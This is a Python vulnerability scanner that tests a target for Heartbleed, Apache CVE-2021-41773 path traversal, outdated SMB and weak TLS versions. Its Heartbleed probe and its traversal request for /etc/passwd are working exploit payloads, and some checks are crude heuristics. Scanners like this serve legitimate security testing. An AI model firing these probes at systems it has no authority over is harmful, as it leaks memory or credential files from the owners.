#!/usr/bin/env python3
import socket
import ssl
import requests
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor
import struct
import time

class VulnScanner:
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.results = []

    def test_heartbleed(self, port=443):
        """Test for Heartbleed vulnerability (CVE-2014-0160)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, port))
            
            # Send Client Hello
            hello = b'\x16\x03\x02\x00\xdc\x01\x00\x00\xd8\x03\x02SC[\xc6\x9b\xc6\x2b\x90\x25\x9b\xc6\x2b\x90\x25\x9b\xc6\x2b\x90\x25\x9b\xc6\x2b\x90\x25\x9b\xc6\x2b\x90\x25\x9b\x00\x00f\xc0\x14\xc0\n\xc0"\xc0!\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\r\xc0\x03\x00\n\xc0\x13\xc0\t\xc0\x1f\xc0\x1e\x00\x33\x00\x32\x00\x9a\x00\x99\x00\x45\x00\x44\xc0\x0e\xc0\x04\x00/\x00\x96\x00A\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\t\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff\x01\x00\x00I\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x1c\x00\x1a\x00\x17\x00\x19\x00\x1c\x00\x1b\x00\x18\x00\x1a\x00\x16\x00\x0e\x00\r\x00\x0b\x00\x0c\x00\t\x00\n\x00#\x00\x00\x00\r\x00 \x00\x1e\x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x00\x0f\x00\x01\x01'
            sock.send(hello)
            
            # Send Heartbeat request
            hb = b'\x18\x03\x02\x00\x03\x01\x40\x00'
            sock.send(hb)
            
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 3 and response[0] == 0x18:
                print(f"[+] VULNERABLE: Heartbleed (CVE-2014-0160) detected on {self.target}:{port}")
                self.results.append(f"Heartbleed vulnerability on port {port}")
            else:
                print(f"[-] Not vulnerable to Heartbleed on port {port}")
                
        except Exception as e:
            print(f"[-] Heartbleed test failed: {e}")

    def test_http_vulns(self, port=80):
        """Test for common HTTP vulnerabilities"""
        try:
            # Test for Apache CVE-2021-41773
            url = f"http://{self.target}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
            response = requests.get(url, timeout=self.timeout, verify=False)
            
            if "root:" in response.text:
                print(f"[+] VULNERABLE: Apache Path Traversal (CVE-2021-41773) on {self.target}:{port}")
                self.results.append(f"Apache Path Traversal on port {port}")
            else:
                print(f"[-] Not vulnerable to CVE-2021-41773 on port {port}")
                
        except Exception as e:
            print(f"[-] HTTP vulnerability test failed: {e}")

    def test_smb_vulns(self, port=445):
        """Test for SMB vulnerabilities"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, port))
            
            # SMB negotiate request
            negotiate = b'\x00\x00\x00\x85\xffSMBr\x00\x00\x00\x00\x18S\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00'
            sock.send(negotiate)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 36:
                # Check for vulnerable SMB versions
                if b'Windows 5.0' in response or b'Windows 5.1' in response:
                    print(f"[+] POTENTIALLY VULNERABLE: Old Windows SMB version detected on {self.target}:{port}")
                    self.results.append(f"Potentially vulnerable SMB version on port {port}")
                else:
                    print(f"[-] SMB version appears updated on port {port}")
            
        except Exception as e:
            print(f"[-] SMB vulnerability test failed: {e}")

    def test_ssl_vulns(self, port=443):
        """Test for SSL/TLS vulnerabilities"""
        try:
            # Test for weak SSL/TLS versions
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.target, port), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                    version = ssock.version()
                    cipher = ssock.cipher()
                    
                    if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        print(f"[+] VULNERABLE: Weak SSL/TLS version {version} on {self.target}:{port}")
                        self.results.append(f"Weak SSL/TLS version {version} on port {port}")
                    else:
                        print(f"[-] SSL/TLS version {version} appears secure on port {port}")
                        
        except Exception as e:
            print(f"[-] SSL vulnerability test failed: {e}")

    def scan_common_vulns(self, port=None):
        """Scan for common vulnerabilities"""
        print(f"[*] Scanning {self.target} for common vulnerabilities")
        
        # Test different services based on common ports
        if port:
            ports = [port]
        else:
            ports = [80, 443, 445, 22, 21, 23, 25, 53, 110, 143, 993, 995]
        
        for p in ports:
            if self.port_open(p):
                print(f"\n[*] Testing port {p}")
                if p == 443:
                    self.test_heartbleed(p)
                    self.test_ssl_vulns(p)
                elif p == 80:
                    self.test_http_vulns(p)
                elif p == 445:
                    self.test_smb_vulns(p)

    def port_open(self, port):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target, port))
            sock.close()
            return result == 0
        except:
            return False

    def scan_all_vulns(self, port=None):
        """Comprehensive vulnerability scan"""
        print(f"[*] Running comprehensive vulnerability scan on {self.target}")
        self.scan_common_vulns(port)
        
        if self.results:
            print(f"\n[+] Found {len(self.results)} potential vulnerabilities:")
            for result in self.results:
                print(f"    - {result}")
        else:
            print("\n[-] No obvious vulnerabilities detected")

    def scan_specific_cve(self, cve, port=443):
        """Test for specific CVE"""
        print(f"[*] Testing for {cve} on {self.target}:{port}")
        
        if "2014-0160" in cve:  # Heartbleed
            self.test_heartbleed(port)
        elif "2021-41773" in cve:  # Apache Path Traversal
            self.test_http_vulns(port)
        else:
            print(f"[-] Specific test for {cve} not implemented")

    def list_vuln_scripts(self):
        """List available vulnerability tests"""
        scripts = [
            "ssl-heartbleed (CVE-2014-0160)",
            "http-vuln-cve2021-41773 (Apache Path Traversal)", 
            "smb-vuln-detection (SMB version check)",
            "ssl-weak-versions (SSL/TLS version check)"
        ]
        
        print(f"[*] Available vulnerability tests:")
        for script in scripts:
            print(f"    {script}")

def main():
    parser = argparse.ArgumentParser(description="Vulnerability Scanner")
    parser.add_argument("target", nargs='?', help="Target IP or hostname")
    parser.add_argument("--port", type=int, help="Specific port to scan")
    parser.add_argument("--cve", help="Specific CVE to test (e.g., CVE-2021-41773)")
    parser.add_argument("--common", action="store_true", help="Scan for common vulnerabilities")
    parser.add_argument("--all", action="store_true", help="Run all vulnerability tests")
    parser.add_argument("--list", action="store_true", help="List available vulnerability tests")
    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout in seconds")
    
    args = parser.parse_args()
    
    if args.list:
        scanner = VulnScanner("dummy")
        scanner.list_vuln_scripts()
        return
    
    if not args.target:
        print("[!] Error: Target required for scanning")
        return
    
    scanner = VulnScanner(args.target, args.timeout)
    
    if args.cve:
        scanner.scan_specific_cve(args.cve, args.port or 443)
    elif args.common:
        scanner.scan_common_vulns(args.port)
    elif args.all:
        scanner.scan_all_vulns(args.port)
    else:
        scanner.scan_all_vulns(args.port)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)